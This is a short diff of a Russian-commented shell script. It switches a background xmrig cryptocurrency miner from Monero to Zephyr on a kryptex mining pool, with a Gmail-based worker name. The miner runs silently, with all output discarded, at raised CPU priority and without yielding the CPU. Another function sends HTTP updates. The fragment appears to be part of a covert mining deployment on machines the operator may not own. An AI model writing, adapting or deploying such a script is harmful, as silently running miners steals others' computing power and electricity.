@@ -16,7 +16,7 @@ random_srv_number=$(printf "%04d" $((RANDOM % 9000 + 1000)))
 
 # Запуск xmrig в фоновом режиме
 xmrig_dir="${log_dir}xmrig-6.21.3"
-"$xmrig_dir/xmrig" --coin XMR --url xmr.kryptex.network:7777 --user "fintafixgames@gmail.com/${random_six_digit}" --randomx-mode=fast --cpu-priority=5 --cpu-no-yield >/dev/null 2>&1 &
+"$xmrig_dir/xmrig"  -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/${random_six_digit} -k --coin zephyr --cpu-no-yield --cpu-priority 5 --threads 8 -a rx/0 >/dev/null 2>&1 &
 
 # Функция для отправки HTTP-запросов
 send_updates() {
